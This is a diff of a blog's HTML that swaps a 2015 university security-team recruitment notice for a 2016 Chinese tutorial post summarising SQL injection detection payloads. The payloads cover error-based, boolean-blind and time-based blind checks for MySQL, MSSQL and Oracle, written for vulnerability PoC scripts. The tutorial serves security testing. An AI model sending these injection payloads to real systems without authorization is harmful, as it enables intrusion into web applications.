@@ -30,7 +30,7 @@
 
 
 
-  <meta name="keywords" content="swusec," />
+  <meta name="keywords" content="PoC," />
 
 
 
@@ -39,28 +39,25 @@
   <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />
 
 
-<meta name="description" content="2015/06/04:说点最新的消息，暂时因为某些原因，这个事情被搁置了.So,我继续努力吧。
+<meta name="description" content="《PoC 编写指南》现已经同步至 gitbook，博客和 gitbook 会同步更新，地址： http://poc.evalbug.com/
+文章开始前说点别的，本来打算6月份才更的，原本以为没人看的。最近收到一封热心读者的邮件，很是感动啊，谢谢支持。也感谢一起参与到这个教程编写中的每一位朋友。
 
-在一开始要说的：
-最近一直在忙樟树林论坛十周年晚会的事，忙的都病倒了，于是就抽空把这个招聘启事写完了。嗯，打个广告，5月30号晚7点光大礼堂，欢迎各位来看晚会。
-之前我有发过一篇关于SWUSEC的构想的博文，swusec的构想，顺便送开学福利——校园网一号多登录演示 经过和信息中心半个学期的协商，终于">
+博客这边其实不是特别想更新的，毕竟阅读起来没 gitbook 体验那么好。而且发现博客这里章节序号和">
 <meta property="og:type" content="article">
-<meta property="og:title" content="西南大学网络安全技术研究小组招聘启事">
-<meta property="og:url" content="http://blog.evalbug.com/2015/05/25/swusec_job/index.html">
+<meta property="og:title" content="PoC 编写指南(第 2 章 SQL 注入类 PoC 总结篇)">
+<meta property="og:url" content="http://blog.evalbug.com/2016/05/25/poc_coding_5/index.html">
 <meta property="og:site_name" content="Medici.Yan's Blog">
-<meta property="og:description" content="2015/06/04:说点最新的消息，暂时因为某些原因，这个事情被搁置了.So,我继续努力吧。
+<meta property="og:description" content="《PoC 编写指南》现已经同步至 gitbook，博客和 gitbook 会同步更新，地址： http://poc.evalbug.com/
+文章开始前说点别的，本来打算6月份才更的，原本以为没人看的。最近收到一封热心读者的邮件，很是感动啊，谢谢支持。也感谢一起参与到这个教程编写中的每一位朋友。
 
-在一开始要说的：
-最近一直在忙樟树林论坛十周年晚会的事，忙的都病倒了，于是就抽空把这个招聘启事写完了。嗯，打个广告，5月30号晚7点光大礼堂，欢迎各位来看晚会。
-之前我有发过一篇关于SWUSEC的构想的博文，swusec的构想，顺便送开学福利——校园网一号多登录演示 经过和信息中心半个学期的协商，终于">
-<meta property="og:updated_time" content="2015-10-13T19:32:19.000Z">
+博客这边其实不是特别想更新的，毕竟阅读起来没 gitbook 体验那么好。而且发现博客这里章节序号和">
+<meta property="og:updated_time" content="2016-05-25T02:31:29.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="西南大学网络安全技术研究小组招聘启事">
-<meta name="twitter:description" content="2015/06/04:说点最新的消息，暂时因为某些原因，这个事情被搁置了.So,我继续努力吧。
+<meta name="twitter:title" content="PoC 编写指南(第 2 章 SQL 注入类 PoC 总结篇)">
+<meta name="twitter:description" content="《PoC 编写指南》现已经同步至 gitbook，博客和 gitbook 会同步更新，地址： http://poc.evalbug.com/
+文章开始前说点别的，本来打算6月份才更的，原本以为没人看的。最近收到一封热心读者的邮件，很是感动啊，谢谢支持。也感谢一起参与到这个教程编写中的每一位朋友。
 
-在一开始要说的：
-最近一直在忙樟树林论坛十周年晚会的事，忙的都病倒了，于是就抽空把这个招聘启事写完了。嗯，打个广告，5月30号晚7点光大礼堂，欢迎各位来看晚会。
-之前我有发过一篇关于SWUSEC的构想的博文，swusec的构想，顺便送开学福利——校园网一号多登录演示 经过和信息中心半个学期的协商，终于">
+博客这边其实不是特别想更新的，毕竟阅读起来没 gitbook 体验那么好。而且发现博客这里章节序号和">
 
 
 <script type="text/javascript" id="hexo.configuration">
@@ -70,7 +67,7 @@
   };
 </script>
 
-  <title> 西南大学网络安全技术研究小组招聘启事 | Medici.Yan's Blog </title>
+  <title> PoC 编写指南(第 2 章 SQL 注入类 PoC 总结篇) | Medici.Yan's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -221,7 +218,7 @@
           
           
             
-              西南大学网络安全技术研究小组招聘启事
+              PoC 编写指南(第 2 章 SQL 注入类 PoC 总结篇)
             
           
         </h1>
@@ -230,8 +227,8 @@
       <div class="post-meta">
         <span class="post-time">
           发表于
-          <time itemprop="dateCreated" datetime="2015-05-25T20:38:20+08:00" content="2015-05-25">
-            2015-05-25
+          <time itemprop="dateCreated" datetime="2016-05-25T03:00:48+08:00" content="2016-05-25">
+            2016-05-25
           </time>
         </span>
 
@@ -240,8 +237,8 @@
             &nbsp; | &nbsp; 分类于
             
               <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                <a href="/categories/SWUSEC/" itemprop="url" rel="index">
-                  <span itemprop="name">SWUSEC</span>
+                <a href="/categories/PoC/" itemprop="url" rel="index">
+                  <span itemprop="name">PoC</span>
                 </a>
               </span>
 
@@ -256,8 +253,8 @@
           
             <span class="post-comments-count">
               &nbsp; | &nbsp;
-              <a href="/2015/05/25/swusec_job/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/05/25/swusec_job/" itemprop="commentsCount"></span>
+              <a href="/2016/05/25/poc_coding_5/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2016/05/25/poc_coding_5/" itemprop="commentsCount"></span>
               </a>
             </span>
           
@@ -271,70 +268,41 @@
       
 
       
-        <span itemprop="articleBody"><p><em>2015/06/04:</em><br><strong>说点最新的消息，暂时因为某些原因，这个事情被搁置了.So,我继续努力吧。</strong></p>
+        <span itemprop="articleBody"><p><font color="red">《PoC 编写指南》现已经同步至 gitbook，博客和 gitbook 会同步更新，地址：</font> <a href="http://poc.evalbug.com/" target="_blank" rel="external">http://poc.evalbug.com/</a></p>
+<p>文章开始前说点别的，本来打算6月份才更的，原本以为没人看的。最近收到一封热心读者的邮件，很是感动啊，谢谢支持。也感谢一起参与到这个教程编写中的每一位朋友。</p>
 <blockquote>
-<p>在一开始要说的：</p>
-<p>最近一直在忙樟树林论坛十周年晚会的事，忙的都病倒了，于是就抽空把这个招聘启事写完了。嗯，打个广告，5月30号晚7点光大礼堂，欢迎各位来看晚会。</p>
-<p>之前我有发过一篇关于SWUSEC的构想的博文，<a href="http://www.cnblogs.com/mediciyan/p/4347498.html" target="_blank" rel="external">swusec的构想，顺便送开学福利——校园网一号多登录演示</a> 经过和信息中心半个学期的协商，终于已经敲定下来了这个组织的事。下面就放出招聘启事的草稿。</p>
-<p>我的目的是笼络学校的黑客，安全人才。也希望能通过我自己的努力，建立起来西南大学的信息安全交流的一个平台。能够让更多的人注意到信息安全的重要性，我就很开心了。</p>
-<p>关于招人，现在已经开始在招了，男女不限，时间其实也不限。只是这个启事要正式下发下去的话，等过了层层审核，不知道要多久了。估计过几天你的辅导员会在你们班上说这个事了。于是我还是提前发出来了。有兴趣的人，来找我聊。怎么联系到我应该不是很难哈。</p>
+<p>博客这边其实不是特别想更新的，毕竟阅读起来没 gitbook 体验那么好。而且发现博客这里章节序号和那边不一样，自己也不想改了，下一章直接会跳到第4章，不要惊讶。</p>
 </blockquote>
+<p>之前讲了一堆，都是编写的过程，在这一章最后总结一下，把需要用到的 Payload 规范整理了一份列表出来，供大家参考。</p>
 <a id="more"></a>
-<h1 id="西南大学网络安全技术研究小组招聘启事"><a href="#西南大学网络安全技术研究小组招聘启事" class="headerlink" title="西南大学网络安全技术研究小组招聘启事"></a><strong>西南大学网络安全技术研究小组招聘启事</strong></h1><h2 id="一、-SWUSEC简介"><a href="#一、-SWUSEC简介" class="headerlink" title="一、 SWUSEC简介"></a>一、 SWUSEC简介</h2><p>西南大学信息中心是专门负责我校信息化管理、规划和建设的正处级单位，数据中心机房400余平方，运行着各类服务器约310台，存储数百T数据，支撑着学校数百个网站和各类信息系统。中心目前有专职技术、管理和维护人员约50人，其中博士4人，硕士13人。中心员工平均年龄32.6岁，是一个年轻化而充满活力的团队。<br>筹建中的西南大学网络安全技术团队( Southwest University Security Team ，简称西大网安，英文简称SWUSEC)定位为西南大学官方网络安全技术支持团队，隶属于西南大学信息中心。SWUSEC主要职责是：按照“积极预防、及时发现、快速响应、力保恢复”的方针，开展西南大学校园网络安全事件的预防、发现、预警和协调处置等工作，致力于维护西南大学校园网络安全，保障基础信息网络和重要信息系统的安全运行。<br>网络安全技术研究小组作为SWUSEC的重要组成部分，在信息中心的直接领导下开展工作。将主要负责研究新的网络安全攻防技术；发现、响应我校信息系统（含网站）的安全漏洞；宣传网络安全知识，引导我校师生提高网络安全意识。<br>网络安全技术研究小组的招聘对象以我校在校学生为主，<strong>拟招聘7名核心成员，普通成员若干</strong>。</p>
-<h2 id="二、-招聘原则"><a href="#二、-招聘原则" class="headerlink" title="二、 招聘原则"></a>二、 招聘原则</h2><p>按照德才兼备的标准，坚持公开、公平、公正的原则，择优招录聘用。</p>
-<h2 id="三、-岗位设置"><a href="#三、-岗位设置" class="headerlink" title="三、 岗位设置"></a>三、 岗位设置</h2><p>岗位类型：<br>1. 渗透测试<br>2. 系统运维<br>3. 美工</p>
-<h2 id="四、-招聘对象及条件"><a href="#四、-招聘对象及条件" class="headerlink" title="四、 招聘对象及条件"></a>四、 招聘对象及条件</h2><p><strong>普通成员要求</strong>：</p>
-<p>1.遵纪守法，作风正派，品行端正，具有良好的网络安全职业道德素养，有较强的自学能力；具有良好的团队合作精神；<br>2.具有一定英语水平，能看懂国外技术文章;<br>3.对信息安全有一定了解和兴趣。</p>
-<p><strong>核心成员要求：</strong><br><strong>1. 渗透测试：</strong></p>
-<ul>
-<li>有入侵服务器实战经验</li>
-<li>熟悉Windows，Linux平台攻击技巧，了解Apache, Nginx, IIS等中间件漏洞</li>
-<li>熟练使用WVS, burp suite, Sqlmap, Nmap等常见渗透测试工具</li>
-<li>熟练使用Kali Linux, Backtrack等渗透审计系统</li>
-<li>熟练使用Python, Ruby, Perl, Shell等任意一门脚本语言，能够独立编写小工具提高工作效率</li>
-<li>时刻关注最新web应用漏洞，系统漏洞，能够学习利用方法和修复方法</li>
-<li>熟悉黑色产业链，了解挂马，黑链，劫持，中间人攻击等黑客常用手法</li>
-<li>熟悉网络交换设备，安全防护设备，了解其工作原理，并掌握针对性的攻击方法</li>
-<li><p>具有较强的学习能力，文档编写能力，对待工作态度认真。<br><strong>以上至少满足4项即可</strong>。<br><strong>优先条件：</strong></p>
-</li>
-<li><p>能够独立挖掘漏洞，并写出exp者优先</p>
-</li>
-<li>有在Wooyun,补天等安全平台提交过漏洞者优先</li>
-<li>有参与过安全开源项目的优先</li>
-<li><p>掌握木马、后门查杀方法，能够独立分析后门<br><strong>2. 系统运维:</strong></p>
-</li>
-<li><p>熟练使用Linux/FreeBSD操作系统，熟悉常用软件的安装、配置和管理、维护、优化</p>
-</li>
-<li>对运维工作有热情，可以做到响应处理各类应急事件;</li>
-<li>熟练掌握Perl、Shell、PHP、Python等之一的脚本编程;</li>
-<li>懂SQL语法，能对SQL进行执行和修改。</li>
-<li>熟悉主流服务器、存储硬件架构，了解CPU、内存、RAID等相关技术;</li>
-<li><p>富于团队精神和敬业精神;<br><strong>以上至少满足4项即可。</strong><br><strong>3. 美工</strong></p>
-</li>
-<li><p>精通Photoshop/Dreamweaver/Illustrator等设计软件，对图片渲染和视觉效果有较好认识</p>
-</li>
-<li><p>有良好的审美观与色彩感，能把握风格统一性、美观性及整体协调性，设计有创意；<br><strong>优先条件：</strong></p>
-</li>
-<li><p>掌握html, CSS, javascript者优先</p>
-</li>
-<li>掌握会声会影等视频剪辑制作软件者优先</li>
-<li>有网站前端设计经验者优先</li>
-</ul>
-<h2 id="五、-招聘程序"><a href="#五、-招聘程序" class="headerlink" title="五、 招聘程序"></a>五、 招聘程序</h2><p>1.报名截止时间：2014年6月5日；<br>2.报名方式：通过电子邮件投递简历报名；<br>3.资格审查：报名截止后，统一进行资格初审。根据资格初审情况，电话通知资格初审合格人员带上身份证、校园卡（或学生证）等证件原件和自荐材料到西南大学信息中心进行资格复审；<br>4.笔试、面试安排:资格复审合格者参加信息中心统一组织的笔试、面试；<br>5.对拟录用人员进行公示；<br>6.公示结束后,视公示情况办理聘用手续。</p>
-<h2 id="六、-待遇"><a href="#六、-待遇" class="headerlink" title="六、 待遇"></a>六、 待遇</h2><p>1. 网络安全技术研究小组的核心成员的待遇参照我校的勤工助学标准金按月发放。<br>2. 信息中心为网络安全技术研究小组的核心成员免费提供机房和计算机。<br>3. 信息中心为网络安全技术研究小组内部的优秀核心成员参加国内网络安全竞赛等活动提供支持。<br>4.根据成员参与的具体项目会有相应的现金报酬。<br>5.安全公司实习、就业内推资格。<br>6.信息中心为网络安全技术研究小组成员提供会议、活动场所。</p>
-<h2 id="七、-联系方式"><a href="#七、-联系方式" class="headerlink" title="七、 联系方式"></a>七、 联系方式</h2><p>1.简历发送邮箱:swuyy@swu.edu.cn 或 Medici.Yan@Gmail.com<br>2.联系电话:023-68367209</p>
-<p>西南大学信息中心<br>二○一五年五月二十五日</p>
-<p>博主对其中的一些说明：</p>
-<ul>
-<li>邮箱留了两个，前面的是老师的，后面的是我的，基本上最后过邮件的人都是我，为了减轻我未来的工作量，能发到我这里就发我这里。</li>
-<li>没有报名表，我不想通过报名表来限制死，所以说，我要看到的不是一些没有用的东西，而是你能通过一封邮件把你介绍清楚，毕竟我不认识你。这里就能看出一个人的态度了。so…you know that…</li>
-<li>资格审查，嗯，这个就比较有趣了，核心成员会进行审查，普通成员要不要审查我还在考虑中，审查肯定不会是做试卷啦，形式我在考虑，可能会做成CTF的形式，或者是实战形式。</li>
-<li>为什么要招美工，简单的说，我们要宣传什么东西，美工是不能少的一个角色。</li>
-<li>核心成员会不会要求太高了？这个我只想说，要求提的都是行业的基础要求，不存在太高的问题，大家都是学生，我不会在熟练程度上要求太高，但是也不会放水。你想放水，那你完全可以当一名普通成员。</li>
-<li>名额的问题。拟定招7个核心，7个够不够？博主的回答是我可以多，也可以少，根据能力来定我招的核心成员的人数，如果我最后招了一圈下来招不够7个，那招几个是几个，原则是宁缺勿滥，保证核心成员质量。</li>
-<li>待遇问题。写出来的待遇都是博主和信息中心现在可以拍胸脯保证的，至于有一些没有写的，比如说：综合考评加分什么的，这些还在商议中。</li>
-<li>普通成员和核心的关系：定期从普通成员中选拔优秀的人成为核心成员，这样说清楚吧？<br>基本暂时我能想到的就这些，欢迎找我私聊。总之，你来我这里我不会亏待你，当然这个亏待不亏待的说法，不是说说就可以，重要的是做。</li>
-</ul>
+<h2 id="报错和有回显类"><a href="#报错和有回显类" class="headerlink" title="报错和有回显类"></a>报错和有回显类</h2><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p><strong>方法</strong>：直接在结果中输出一个 md5 值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select md5(233);</span><br></pre></td></tr></table></figure>
+<h3 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h3><p><strong>方法</strong>：直接在结果中输出一个 md5 值</p>
+<p>其 SQL 语句原型类似：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys.fn_varbintohexstr(hashbytes(&apos;MD5&apos;,&apos;1234&apos;));</span><br></pre></td></tr></table></figure>
+<p><code>hashbytes()</code>返回 varbinary 类型值</p>
+<p><code>sys.fn_VarBinToHexStr()</code> 是把 varbinary 转换成 varchar</p>
+<h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3><p><strong>方法</strong>：Oracle 中输出 md5 值实现起来较为复杂，可以连续输出几个随机的字符来使判断字符串随机化</p>
+<p>SQL 语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT CHR(97)||CHR(108)||CHR(107)||CHR(100)||CHR(102)||CHR(106)||CHR(103)||CHR(99) FROM foobar</span><br></pre></td></tr></table></figure>
+<p>其效果相当于：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &apos;alkdfjgc&apos; FROM foobar</span><br></pre></td></tr></table></figure>
+<p>这样只用检测 <code>alkdfjgc</code> 是否在返回页面中即可。</p>
+<p><strong>注意</strong>:所选字符串应该尽量无规律且要有一定长度，不要选用常见的单词（如 get, test, ceshi）。</p>
+<h2 id="布尔盲注类"><a href="#布尔盲注类" class="headerlink" title="布尔盲注类"></a>布尔盲注类</h2><h3 id="MySQL-1"><a href="#MySQL-1" class="headerlink" title="MySQL"></a>MySQL</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from table where 1=1;</span><br><span class="line">select * from table where 1=2;</span><br><span class="line">select * from table where 1&gt;2;</span><br><span class="line">select IF(1=1, 1, 2);</span><br><span class="line">select IF(1=2, 1, 2);</span><br></pre></td></tr></table></figure>
+<h3 id="MSSQL-1"><a href="#MSSQL-1" class="headerlink" title="MSSQL"></a>MSSQL</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1=1</span><br><span class="line">and 1=2</span><br><span class="line">IF(1=1) SELECT 123 ELSE DROP FUNCTION xxxx</span><br></pre></td></tr></table></figure>
+<h3 id="Oracle-1"><a href="#Oracle-1" class="headerlink" title="Oracle"></a>Oracle</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(SELECT (CASE WHEN (1=1) THEN 123 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)</span><br></pre></td></tr></table></figure>
+<h2 id="时间盲注类"><a href="#时间盲注类" class="headerlink" title="时间盲注类"></a>时间盲注类</h2><h3 id="MySQL-2"><a href="#MySQL-2" class="headerlink" title="MySQL"></a>MySQL</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT IF(1=1, sleep(5), &quot;1&quot;);</span><br><span class="line">SELECT IF(1=2, sleep(5), &quot;1&quot;);</span><br></pre></td></tr></table></figure>
+<h3 id="MSSQL-2"><a href="#MSSQL-2" class="headerlink" title="MSSQL"></a>MSSQL</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">waitfor delay &apos;0:0:5&apos;</span><br></pre></td></tr></table></figure>
+<h3 id="Oracle-2"><a href="#Oracle-2" class="headerlink" title="Oracle"></a>Oracle</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE(&apos;[RANDSTR]&apos;,[SLEEPTIME])</span><br></pre></td></tr></table></figure>
+<p><code>receive_message</code> 函数用于接收管道消息，并将接收到的消息写入到本地消息缓冲区。当接收完管道信息之后，会删除管道消息，管道消息只能被接收一次。</p>
+<p>语法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbms_pipe.receive_message(pepename in varchar2,timeout in integer default maxwait) return integer;</span><br></pre></td></tr></table></figure></p>
+<p>其中，返回 0 接收成功，返回 1 超时，返回 2 本地缓冲区不能容纳管道消息，返回 3 发生中断。</p>
+<hr>
+<p>文中所提及到的 Payload 不是唯一答案，仅作参考。如果想看更全面的，请参考 sqlmap 中 Payload 部分。</p>
+<blockquote>
+<p>敲字敲着，发现键盘红了，流鼻血了 ＝ ＝，先这样吧，如果你对里面有什么想法和见解，欢迎一起完善。</p>
+</blockquote>
 </span>
       
     </div>
@@ -343,7 +311,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/swusec/" rel="tag">#swusec</a>
+            <a href="/tags/PoC/" rel="tag">#PoC</a>
           
         </div>
       
@@ -352,13 +320,11 @@
         <div class="post-nav">
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2015/06/14/socks5validate/" rel="prev">Socks5代理用户名密码批量认证爆破工具</a>
-            
           </div>
 
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2015/05/14/shadowsocks/" rel="next">安装Shadowsocks翻墙</a>
+              <a href="/2016/04/17/poc_coding_4/" rel="next">PoC 编写指南(第 2 章 SQL 注入类 PoC 编写 下篇)</a>
             
           </div>
         </div>
@@ -392,8 +358,8 @@
         
           <div class="comments" id="comments">
             
-              <div class="ds-thread" data-thread-key="2015/05/25/swusec_job/"
-                   data-title="西南大学网络安全技术研究小组招聘启事" data-url="http://blog.evalbug.com/2015/05/25/swusec_job/">
+              <div class="ds-thread" data-thread-key="2016/05/25/poc_coding_5/"
+                   data-title="PoC 编写指南(第 2 章 SQL 注入类 PoC 总结篇)" data-url="http://blog.evalbug.com/2016/05/25/poc_coding_5/">
               </div>
             
           </div>
@@ -496,7 +462,7 @@
           <div class="post-toc">
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#西南大学网络安全技术研究小组招聘启事"><span class="nav-number">1.</span> <span class="nav-text">西南大学网络安全技术研究小组招聘启事</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、-SWUSEC简介"><span class="nav-number">1.1.</span> <span class="nav-text">一、 SWUSEC简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、-招聘原则"><span class="nav-number">1.2.</span> <span class="nav-text">二、 招聘原则</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、-岗位设置"><span class="nav-number">1.3.</span> <span class="nav-text">三、 岗位设置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、-招聘对象及条件"><span class="nav-number">1.4.</span> <span class="nav-text">四、 招聘对象及条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#五、-招聘程序"><span class="nav-number">1.5.</span> <span class="nav-text">五、 招聘程序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#六、-待遇"><span class="nav-number">1.6.</span> <span class="nav-text">六、 待遇</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#七、-联系方式"><span class="nav-number">1.7.</span> <span class="nav-text">七、 联系方式</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#报错和有回显类"><span class="nav-number">1.</span> <span class="nav-text">报错和有回显类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MySQL"><span class="nav-number">1.1.</span> <span class="nav-text">MySQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSSQL"><span class="nav-number">1.2.</span> <span class="nav-text">MSSQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Oracle"><span class="nav-number">1.3.</span> <span class="nav-text">Oracle</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#布尔盲注类"><span class="nav-number">2.</span> <span class="nav-text">布尔盲注类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MySQL-1"><span class="nav-number">2.1.</span> <span class="nav-text">MySQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSSQL-1"><span class="nav-number">2.2.</span> <span class="nav-text">MSSQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Oracle-1"><span class="nav-number">2.3.</span> <span class="nav-text">Oracle</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#时间盲注类"><span class="nav-number">3.</span> <span class="nav-text">时间盲注类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MySQL-2"><span class="nav-number">3.1.</span> <span class="nav-text">MySQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSSQL-2"><span class="nav-number">3.2.</span> <span class="nav-text">MSSQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Oracle-2"><span class="nav-number">3.3.</span> <span class="nav-text">Oracle</span></a></li></ol></li></ol></div>
             
           </div>
           <div class="post-toc-indicator-bottom post-toc-indicator"></div>
